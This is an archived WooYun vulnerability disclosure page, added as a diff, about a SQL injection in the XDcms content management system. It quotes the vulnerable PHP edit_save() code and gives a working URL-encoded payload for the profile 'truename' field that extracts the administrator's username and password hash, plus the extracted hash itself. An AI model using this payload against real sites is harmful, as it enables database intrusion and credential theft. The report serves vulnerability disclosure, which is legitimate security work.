@@ -1,0 +1,244 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		xdcms通用型全版本注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		xdcms通用型全版本注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/西毒">西毒</a> 
+</li><li>提交时间：		2013-11-20 11:53</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-25：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-02-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">由于在修改过程中，未充分考虑到过滤参数，导致sql注入漏洞，利用反引号· 绕过导致形成全版本注入漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://www.xdcms.cn<br />
+<br />
+ 南宁旭东网络科技有限公司是致力于互联网技术研究应用、依托互联网络进行市场运营的高新技术科技团队。经过近一年时间的调研、研发、测试，2012年1月旭东科技推出了核心产品——XDcms订餐网站系统，系统依托于市场分析调查、可行性分析的基础之上提供在线订餐的整体解决方案，并相继推出手机版订餐、无线打印机等附加功能，获得了中华人民共和国国家版权局颁发的计算机软件著作权登记证书。<br />
+<br />
+通过关键字搜索，旭东内容管理系统应用广泛，达到5000多站点采用该cms<br />
+<br />
+ </p><p class="detail"><a href="../images/191507164569c458e28e829e33350858a8b03ca2.jpg" target="_blank"><img src="../images/191507164569c458e28e829e33350858a8b03ca2.jpg" alt="@A}I]XUA$}FQ05YI1}YXIIR.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+   由于在修改过程中，未充分考虑到过滤参数，导致sql注入漏洞，利用反引号· 绕过导致形成全版本注入漏洞<br />
+<br />
+1、在system\modules\member\index.php 中<br />
+<br />
+public function edit_save(){<br />
+<br />
+		$this-&gt;member_info();<br />
+<br />
+		$userid=intval(Cookie::_getcookie(&#039;member_userid&#039;));<br />
+<br />
+		$fields=$_POST[&#039;fields&#039;];<br />
+<br />
+		//修改资料<br />
+<br />
+		$field_sql=&#039;&#039;;<br />
+<br />
+		foreach($fields as $k=&gt;$v){<br />
+<br />
+			$f_value=$v;<br />
+<br />
+			if(is_array($v)){<br />
+<br />
+				$f_value=implode(&#039;,&#039;,$v);<br />
+<br />
+			}<br />
+<br />
+			$field_sql.=&quot;,`{$k}`=&#039;&quot;.safe_html($f_value).&quot;&#039;&quot;; //这里产生漏洞<br />
+<br />
+		}<br />
+<br />
+		$field_sql=substr($field_sql,1);<br />
+<br />
+		$field_sql=&quot;update &quot;.DB_PRE.&quot;member set {$field_sql} where userid={$userid}&quot;;<br />
+<br />
+		//echo $field_sql;exit();<br />
+<br />
+		$query=$this-&gt;mysql-&gt;query($field_sql);<br />
+<br />
+		<br />
+<br />
+		showmsg(C(&#039;update_success&#039;),&#039;index.php?m=member&amp;f=edit&#039;);<br />
+<br />
+	}<br />
+<br />
+然后当我们修改个人资料时候抓包<br />
+<br />
+</p><p class="detail"><a href="../images/19150839a9de8f8da89e50ec6bea65c7e5f4d5e3.jpg" target="_blank"><img src="../images/19150839a9de8f8da89e50ec6bea65c7e5f4d5e3.jpg" alt=")LXGKF`DTV(%YC5%[TK(PKY.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+   </p><p class="detail"><a href="../images/1915090881abb7d7cc6d57782b455c4ea784a509.jpg" target="_blank"><img src="../images/1915090881abb7d7cc6d57782b455c4ea784a509.jpg" alt="0ZW}L]9BEN90SA$S)ZLHXER.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+然后我们将truename值进行修改为<br />
+<br />
+%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23<br />
+<br />
+其实这是urlencode编码了的，解码为 `=(select group_concat(username,0x3a,password) from c_admin where id=1)#<br />
+<br />
+</p><p class="detail"><a href="../images/1915094506d4ce2cc9c6fd716ca4db1c4aaaf952.jpg" target="_blank"><img src="../images/1915094506d4ce2cc9c6fd716ca4db1c4aaaf952.jpg" alt="3}Z3L2Z2[~P~BS(ZR_9J{{R.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+最终执行sql语句为<br />
+<br />
+</p><p class="detail"><a href="../images/1915101663267ff1507551b3ee461206d0dafa5b.jpg" target="_blank"><img src="../images/1915101663267ff1507551b3ee461206d0dafa5b.jpg" alt="2HLGJQ7M3~0U]]PY_9]UIQR.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+最终在姓名这里会显示管理员用户名和密码<br />
+<br />
+</p><p class="detail"><a href="../images/1915105016a197ee5a2676dea71ae7a17c5535f7.jpg" target="_blank"><img src="../images/1915105016a197ee5a2676dea71ae7a17c5535f7.jpg" alt="0C[I3~4F$[5_%~WL50M65H0.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+admin:77dfa0aa87d044cf094643b3dd76c471<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">最终在姓名这里会显示管理员用户名和密码<br />
+<br />
+</p><p class="detail"><a href="../images/1915105016a197ee5a2676dea71ae7a17c5535f7.jpg" target="_blank"><img src="../images/1915105016a197ee5a2676dea71ae7a17c5535f7.jpg" alt="0C[I3~4F$[5_%~WL50M65H0.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+admin:77dfa0aa87d044cf094643b3dd76c471 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">增加过滤，以及充分考虑传参过程？ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/西毒" title="西毒">西毒</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043334" title="xdcms通用型全版本注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-25 11:54</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43334";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
